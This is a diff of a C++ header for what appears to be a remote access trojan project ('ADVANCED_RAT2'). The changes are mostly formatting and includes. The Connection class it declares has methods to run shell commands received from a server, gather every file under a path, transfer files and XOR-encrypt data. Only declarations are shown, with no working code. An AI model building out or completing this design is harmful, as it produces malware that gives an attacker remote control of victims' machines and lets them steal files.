@@ -1,37 +1,40 @@
 //
 // Created by avita on 07/08/2020.
 //
+#define WIN32_LEAN_AND_MEAN
+
 
 #ifndef ADVANCED_RAT2_CONNECTION_H
 #define ADVANCED_RAT2_CONNECTION_H
 
+
 #include <iostream>
 #include <string>
 #include <cstring>
-#include <WS2tcpip.h>
 #include <vector>
 #include <memory>
 #include <fstream>
+
+#include <WS2tcpip.h>
 #include <windows.h>
 #include<algorithm>
-#include <filesystem>
+#include <experimental/filesystem>
 
 
 #define BufferSize 1024
 
 
 #pragma warning(disable:4996)
-
-#pragma comment(lib, "ws2_32.lib")
-
+#pragma comment (lib, "Ws2_32.lib")
 
 using namespace std;
+using namespace experimental;
 
 
 class Connection {
     string ip;
     int port;
-    vector<filesystem::path> *files;
+    vector<filesystem::path>* files;
     SOCKET sock;
 
 public:
@@ -46,13 +49,13 @@ public:
     void recvFile(string path);
 
     //Sending message to the server
-    void sendMessage(const string message , SOCKET socket);
+    void sendMessage(const string message, SOCKET socket);
 
     //Getting command from the server
     void executeShell(string shell);
 
     //Saving all files in path
-    vector<filesystem::path> &getAllFiles(string path, vector<filesystem::path> files);
+    vector<filesystem::path>& getAllFiles(string path, vector<filesystem::path> files);
 
     //Encrypt data with xor encryption with key
     string encryptData(string data, string key);
